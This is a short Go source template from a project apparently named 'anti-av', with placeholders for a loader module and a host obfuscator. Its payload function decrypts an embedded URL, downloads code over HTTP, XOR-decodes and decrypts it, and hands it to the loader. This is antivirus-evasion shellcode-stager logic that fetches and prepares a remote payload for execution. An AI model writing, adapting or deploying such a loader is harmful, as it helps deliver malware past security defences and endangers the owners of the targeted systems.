package main

import (
	"bytes"
	"fmt"

	"github.com/b1gcat/anti-av/dist/_tmp/{{.LOADER}}"
	"github.com/b1gcat/anti-av/utils"
)

func hiJack() {
	fmt.Println("[-] ", {{.LOADER}}.Hi(payload))
}

func payload(code []byte) ([]byte, error) {
	var err error
	if bytes.HasPrefix(code, []byte{0x0, 0x0, 0x0, 0x0}) {
		fmt.Println("[+] http download...")
		url, err := utils.DeCrypt(code)
		if err != nil {
			return nil, err
		}
		code, err = utils.HttpGet(string(url), "{{.HOST_OBFUSCATOR}}")
		if err != nil {
			return nil, err
		}

		kek := utils.Kek(code[4:])
		for k := range kek {
			code[k]^= kek[k]
		}
	}
	code, err = utils.DeCrypt(code)
	if err != nil {
		return nil, err
	}
	return code, nil
}
